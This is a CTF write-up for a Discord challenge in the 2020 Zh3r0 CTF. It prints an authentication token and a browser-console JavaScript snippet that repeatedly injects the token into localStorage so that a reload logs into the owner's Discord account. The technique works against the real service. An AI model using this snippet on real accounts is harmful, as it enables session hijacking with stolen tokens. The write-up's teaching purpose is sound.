This is a writeup for the Discord challenge in the 2020 Zh3r0 CTF.

The description of the challenge gives you some sort of hash that looks very much like a web authentication hash.

`NzIyMzM1MTQ5NDA0MTkyODIw.Xuhmgw.SZfbikLok4FRqbHQY4L3htLcTaU`


The solution to this challenge is based on the way discord handles authentication tokens through the browsers local storage. This article describes the concept well:
https://blog.himbeer.me/2019/09/02/updated-2019-finding-out-your-discord-users-token-on-mobile-too/

Because of this, we can use a piece of javascript in the browser console to skirt the protections that are in place by discord. 

```
function login(token){
    setInterval(() => {
        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
        location.reload();
    }, 2500);
}

login("NzIyMzM1MTQ5NDA0MTkyODIw.Xuhmgw.SZfbikLok4FRqbHQY4L3htLcTaU");
```

To get to the console, in firefox you can either use ctrl + shift + I or navigate to the options menu and navigate to Web Developer > Web Console.

From there, paste the code above into your browser's javascript console


The protection that is in place by discord is to remove the token property from the local storage object when a page is reloaded. However, with the code that we used, the token property is being constantly reinitialized during the page refresh, so that the browser eventually submits it to the webserver, granting access to the account that the token was generated from.



